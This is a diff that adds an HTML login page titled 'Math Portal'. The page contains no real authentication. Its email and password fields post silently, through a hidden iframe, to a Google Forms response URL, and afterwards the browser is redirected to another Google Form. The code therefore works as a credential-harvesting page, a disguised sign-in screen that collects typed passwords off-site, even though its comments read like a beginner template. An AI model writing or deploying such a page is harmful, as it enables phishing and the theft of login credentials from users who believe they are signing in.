@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login — Math Portal</title>
+
+<style>
+  body {
+    font-family: "Segoe UI", sans-serif;
+    background: linear-gradient(135deg, #004aad, #5de0e6);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+
+  .login-container {
+    background: white;
+    padding: 40px;
+    border-radius: 16px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    width: 320px;
+    text-align: center;
+  }
+
+  h2 {
+    margin-bottom: 25px;
+    color: #004aad;
+  }
+
+  input[type="email"],
+  input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    box-sizing: border-box;
+    font-size: 15px;
+  }
+
+  button {
+    background: #004aad;
+    color: white;
+    padding: 12px;
+    width: 100%;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: 0.3s ease;
+  }
+
+  button:hover {
+    background: #00337a;
+  }
+
+  .links {
+    margin-top: 15px;
+    font-size: 14px;
+  }
+
+  .links a {
+    color: #004aad;
+    text-decoration: none;
+  }
+
+  .links a:hover {
+    text-decoration: underline;
+  }
+</style>
+</head>
+<body>
+
+<div class="login-container">
+  <h2>Login</h2>
+
+  <!-- ✅ Connect to your Google Form -->
+  <form 
+    action="https://docs.google.com/forms/d/e/1FAIpQLSehRadk6y3WzT7r04yVpeZicgagdoCuoLYwqqajyb250zMYfg/formResponse"
+    method="POST"
+    target="hidden_iframe"
+    onsubmit="submitted=true;">
+
+    <!-- Replace entry.xxxxxx with your real field names -->
+    <input type="email" name="entry.123456789" placeholder="Email address" required><br>
+    <input type="password" name="entry.987654321" placeholder="Password" required><br>
+
+    <button type="submit">Sign In</button>
+  </form>
+
+  <div class="links">
+    <p>Don’t have an account? <a href="#">Register</a></p>
+  </div>
+</div>
+
+<!-- ✅ Hidden iframe to handle silent Google Form submission -->
+<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" 
+onload="if(submitted){window.location='https://docs.google.com/forms/d/e/1FAIpQLScjxyK0YhNV2z8toMN_FyM5Nc-vubtGgyrdCq0re70uI64MEg/viewform?usp=sharing&ouid=108665366508694961345';}">
+</iframe>
+
+<script>
+  let submitted = false;
+</script>
+
+</body>
+</html>
